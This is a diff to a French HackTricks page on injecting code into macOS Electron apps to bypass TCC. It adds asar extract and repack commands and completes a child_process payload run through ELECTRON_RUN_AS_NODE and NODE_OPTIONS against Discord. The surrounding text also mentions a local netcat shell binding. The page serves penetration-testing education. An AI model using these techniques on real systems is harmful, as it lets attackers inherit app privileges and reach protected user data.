@@ -72,11 +72,19 @@ Cependant, il y a actuellement 2 limitations :
 * L'autorisation **`kTCCServiceSystemPolicyAppBundles`** est **nécessaire** pour modifier une application, donc par défaut cela n'est plus possible.
 * Le fichier **`asap`** compilé a généralement les fusibles **`embeddedAsarIntegrityValidation`** et **`onlyLoadAppFromAsar`** activés
 
-Ce qui rend ce chemin d'attaque plus compliqué (ou impossible).
+Cela rend ce chemin d'attaque plus compliqué (voire impossible).
 {% endhint %}
 
 Notez qu'il est possible de contourner l'exigence de **`kTCCServiceSystemPolicyAppBundles`** en copiant l'application dans un autre répertoire (comme **`/tmp`**), en renommant le dossier **`app.app/Contents`** en **`app.app/NotCon`**, en **modifiant** le fichier **asar** avec votre code **malveillant**, en le renommant à nouveau en **`app.app/Contents`** et en l'exécutant.
 
+Vous pouvez extraire le code du fichier asar avec :
+```bash
+npx asar extract app.asar app-decomp
+```
+Et le reconditionner après l'avoir modifié avec :
+```bash
+npx asar pack app-decomp app-new.asar
+```
 ## RCE avec `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
 Selon [**la documentation**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), si cette variable d'environnement est définie, elle démarrera le processus en tant que processus Node.js normal.
@@ -127,7 +135,7 @@ Vous pouvez stocker la charge utile dans un fichier différent et l'exécuter :
 {% code overflow="wrap" %}
 ```bash
 # Content of /tmp/payload.js
-require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
+require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');
 
 # Execute
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -204,7 +212,7 @@ Vous pouvez exploiter cette variable d'environnement dans un fichier plist pour 
 ## Contournement de TCC en abusant des anciennes versions
 
 {% hint style="success" %}
-Le démon TCC de macOS ne vérifie pas la version exécutée de l'application. Donc, si vous **ne pouvez pas injecter de code dans une application Electron** avec l'une des techniques précédentes, vous pouvez télécharger une version précédente de l'application et y injecter du code car elle obtiendra toujours les privilèges TCC.
+Le démon TCC de macOS ne vérifie pas la version exécutée de l'application. Donc, si vous **ne pouvez pas injecter de code dans une application Electron** avec l'une des techniques précédentes, vous pouvez télécharger une version précédente de l'application et y injecter du code car elle obtiendra toujours les privilèges TCC (à moins que le cache de confiance ne l'empêche).
 {% endhint %}
 
 ## Injection automatique
@@ -257,8 +265,8 @@ Shell binding requested. Check `nc 127.0.0.1 12345`
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
-* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? Ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
+* Découvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
 * Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
 * **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
